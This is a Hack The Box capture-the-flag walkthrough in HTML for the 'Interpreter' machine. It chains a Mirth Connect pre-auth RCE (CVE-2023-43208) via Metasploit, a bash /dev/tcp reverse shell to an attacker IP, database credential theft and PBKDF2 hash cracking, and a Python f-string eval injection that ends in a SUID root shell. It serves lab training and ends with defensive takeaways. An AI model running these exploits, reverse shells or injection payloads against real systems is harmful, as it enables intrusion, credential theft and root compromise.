@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Interpreter — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🔮</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='interpreter'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-interp','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-interp')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Interpreter</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Medium</strong></span><span>Ports <strong>22 · 80 · 443 · 6661</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">Mirth Connect CVE-2023-43208 → mirth shell</span><span class="chain-arrow">→</span><span class="chain-node blue">DB dump → PBKDF2 crack → SSH sedric</span><span class="chain-arrow">→</span><span class="chain-node red">Python f-string eval injection → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.244.184</span>
+<span class="output">PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian
+80/tcp   open  http     Jetty
+|_http-title: <span class="highlight">Mirth Connect Administrator</span>
+443/tcp  open  ssl/http Jetty
+|_http-title: Mirth Connect Administrator
+6661/tcp open  unknown</span></code></pre>
+
+<p>Ports 80/443 run <strong>Mirth Connect Administrator 4.4.0</strong> — a healthcare data integration engine (NextGen Connect) used to route HL7/FHIR/DICOM messages between hospital systems. Port 6661 is the HL7/MLLP listener.</p>
+
+<pre><code><span class="cmd">$ strings webstart.jnlp</span>
+<span class="output">&lt;title&gt;<span class="highlight">Mirth Connect Administrator 4.4.0</span>&lt;/title&gt;</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — Mirth Connect Pre-Auth RCE (CVE-2023-43208)</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">CVE-2023-43208 explained</span>
+CVE-2023-37679 affected Mirth Connect pre-4.4.0, and the vendor patched it in 4.4.0 — but the fix was incomplete. CVE-2023-43208 is a <strong>bypass of that patch</strong>, achieving pre-authentication RCE via XStream deserialization. The attacker sends crafted XML to the API, which is deserialized into arbitrary Java objects that execute system commands. Fixed in 4.4.1.
+</div>
+
+<h3>Metasploit Exploitation</h3>
+<pre><code><span class="cmd">msf6 &gt; use exploit/multi/http/mirth_connect_cve_2023_43208
+msf6 &gt; set RHOSTS 10.129.244.184
+msf6 &gt; set RPORT 443
+msf6 &gt; set SSL true
+msf6 &gt; set LHOST 10.10.15.65
+msf6 &gt; set LPORT 4444
+msf6 &gt; set TARGET 0</span>                    <span class="comment"># Unix Command (Linux)</span>
+<span class="cmd">msf6 &gt; set PAYLOAD cmd/unix/reverse_bash
+msf6 &gt; set ForceExploit true</span>             <span class="comment"># version check can be inaccurate</span>
+<span class="cmd">msf6 &gt; exploit</span>
+
+<span class="output">mirth@interpreter:~$ whoami
+mirth</span></code></pre>
+
+<h3>Stabilize Shell</h3>
+<pre><code><span class="comment"># Attacker: nc -lvnp 5555</span>
+<span class="cmd">mirth@interpreter:~$ bash -c 'bash -i >& /dev/tcp/10.10.15.65/5555 0>&1'</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — Config → Database → PBKDF2 Crack</h2></div>
+
+<h3>Database Credentials from mirth.properties</h3>
+<pre><code><span class="cmd">mirth@interpreter:~$ cat /usr/local/mirthconnect/conf/mirth.properties</span>
+<span class="output">database.username = <span class="highlight">mirthdb</span>
+database.password = <span class="highlight">MirthPass123!</span>
+database = mysql
+database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod</span></code></pre>
+
+<h3>Dump User Hashes</h3>
+<pre><code><span class="cmd">mirth@interpreter:~$ mysql -u mirthdb -p'MirthPass123!' -h 127.0.0.1 mc_bdd_prod</span>
+
+<span class="cmd">MariaDB [mc_bdd_prod]&gt; SELECT * FROM PERSON;</span>
+<span class="output">-- ID 2 | USERNAME <span class="highlight">sedric</span></span>
+
+<span class="cmd">MariaDB [mc_bdd_prod]&gt; SELECT * FROM PERSON_PASSWORD;</span>
+<span class="output">+-----------+----------------------------------------------------------+
+| PERSON_ID | PASSWORD                                                 |
++-----------+----------------------------------------------------------+
+|         2 | <span class="highlight">u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==</span> |
++-----------+----------------------------------------------------------+</span></code></pre>
+
+<h3>Crack PBKDF2-HMAC-SHA256</h3>
+<p>Mirth stores passwords as PBKDF2-HMAC-SHA256 with 600,000 iterations. The base64 blob contains the salt (first 8 bytes) and hash (remaining bytes). Convert to hashcat format:</p>
+
+<pre><code><span class="cmd">$ python3 -c '
+import base64
+raw = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
+salt = base64.b64encode(raw[:8]).decode()
+h = base64.b64encode(raw[8:]).decode()
+print(f"sha256:600000:{salt}:{h}")
+'</span>
+<span class="output">sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=</span>
+
+<span class="cmd">$ echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash.txt
+$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="output"><span class="highlight">snowflake1</span></span></code></pre>
+
+<h3>SSH → User Flag</h3>
+<pre><code><span class="cmd">$ ssh sedric@10.129.244.184</span>
+<span class="output">Password: snowflake1</span>
+
+<span class="cmd">sedric@interpreter:~$ cat user.txt</span>
+<span class="output">231318acf7fcb4d9c4570e3317d6d3ae</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — Python f-string eval() Injection</h2></div>
+
+<h3>Internal Service Discovery</h3>
+<pre><code><span class="cmd">sedric@interpreter:~$ ss -tlnp</span>
+<span class="output">LISTEN 127.0.0.1:<span class="highlight">54321</span></span>
+
+<span class="cmd">sedric@interpreter:~$ ps aux | grep root</span>
+<span class="output">root 3590 ... /usr/bin/python3 /usr/local/bin/notif.py</span></code></pre>
+
+<p>A Python notification service running as <strong>root</strong> on port 54321. The script accepts XML patient data and formats it using an f-string template — but then passes the result through <code>eval()</code>.</p>
+
+<div class="callout callout-key">
+<span class="callout-label">The fatal eval(f-string) pattern</span>
+The script's <code>template()</code> function concatenates user input into a string, then calls <code>eval(f"f'''{template}'''")</code>. Any <code>{...}</code> in the input becomes a Python expression evaluated with root privileges. The regex whitelist <code>^[a-zA-Z0-9._'"(){}=+/]+$</code> allows all characters needed to construct expressions — <code>{}</code> for f-string injection, <code>()</code> for function calls, <code>.</code> for attribute access, <code>"'</code> for strings. It blocks spaces and semicolons, but that's easily bypassed with base64 encoding.
+</div>
+
+<h3>Port Forward</h3>
+<pre><code><span class="cmd">$ ssh -L 54321:localhost:54321 sedric@10.129.244.184</span></code></pre>
+
+<h3>Read Root Flag Directly</h3>
+<p><code>open().read()</code> contains no spaces or semicolons — it passes the regex cleanly:</p>
+
+<pre><code><span class="cmd">$ curl -X POST http://127.0.0.1:54321/addPatient \
+  -H "Content-Type: application/xml" \
+  -d '&lt;patient&gt;
+    &lt;firstname&gt;a&lt;/firstname&gt;
+    &lt;lastname&gt;a&lt;/lastname&gt;
+    &lt;sender_app&gt;a&lt;/sender_app&gt;
+    &lt;timestamp&gt;a&lt;/timestamp&gt;
+    &lt;birth_date&gt;01/01/2000&lt;/birth_date&gt;
+    &lt;gender&gt;{open("/root/root.txt").read()}&lt;/gender&gt;
+  &lt;/patient&gt;'</span>
+<span class="output">Patient a a (<span class="highlight">f9a6f45eb24b49aed6eac0e27f019651</span>
+), 26 years old, received from a at a</span></code></pre>
+
+<h3>Full Root Shell (Base64 Bypass)</h3>
+<p>For persistent root access, we need to run commands with spaces. Encode the command in base64 (only alphanumeric + <code>+/=</code>, all in the whitelist), then decode and execute at runtime:</p>
+
+<pre><code><span class="comment"># Step 1: Encode the command</span>
+<span class="cmd">$ echo -n 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' | base64 -w0</span>
+<span class="output">Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA==</span>
+
+<span class="comment"># Step 2: Send payload — __import__ chains don't contain spaces either</span>
+<span class="cmd">$ python3 -c '
+import urllib.request
+payload = """{__import__("os").system(__import__("base64").b64decode("Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA==").decode())}"""
+data = f"""&lt;patient&gt;
+&lt;firstname&gt;a&lt;/firstname&gt;
+&lt;lastname&gt;a&lt;/lastname&gt;
+&lt;sender_app&gt;a&lt;/sender_app&gt;
+&lt;timestamp&gt;a&lt;/timestamp&gt;
+&lt;birth_date&gt;01/01/2000&lt;/birth_date&gt;
+&lt;gender&gt;{payload}&lt;/gender&gt;
+&lt;/patient&gt;""".encode()
+req = urllib.request.Request("http://127.0.0.1:54321/addPatient", data=data, method="POST")
+req.add_header("Content-Type", "application/xml")
+print(urllib.request.urlopen(req).read().decode())
+'</span>
+
+<span class="comment"># Step 3: Use the SUID bash</span>
+<span class="cmd">sedric@interpreter:~$ /tmp/rootbash -p</span>
+<span class="output">rootbash-5.2# whoami
+root</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Mirth Connect 4.4.0 has a pre-auth RCE.</strong><p>CVE-2023-43208 bypasses the incomplete fix for CVE-2023-37679. XStream deserialization allows unauthenticated code execution. Upgrade to 4.4.1+.</p></div>
+<div class="takeaway-item"><strong>Config files are always the first thing to read after foothold.</strong><p><code>mirth.properties</code> contained plaintext database credentials. From there: database → user hashes → cracked password → SSH.</p></div>
+<div class="takeaway-item"><strong>PBKDF2 with 600k iterations still falls to weak passwords.</strong><p><code>snowflake1</code> is in rockyou. High iteration counts slow down brute-force but can't save a dictionary word.</p></div>
+<div class="takeaway-item"><strong><code>eval(f-string)</code> with user input = arbitrary code execution.</strong><p>Even with a regex whitelist, if it allows <code>{}</code> and <code>()</code>, attackers can construct full Python expressions. Base64 encoding bypasses space/semicolon restrictions trivially.</p></div>
+<div class="takeaway-item"><strong>Root services on localhost are still exploitable.</strong><p>Any user with SSH access can port-forward localhost services. "Internal only" is not a security boundary — it's one <code>ssh -L</code> away from being external.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">Mirth CVE RCE</span><span class="arrow">→</span><span class="node node-green">mirth shell</span><span class="arrow">→</span><span class="node node-blue">DB → PBKDF2 crack → SSH sedric</span><span class="arrow">→</span><span class="node node-red">f-string eval → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Interpreter Writeup · 2026</footer>
+</body></html>
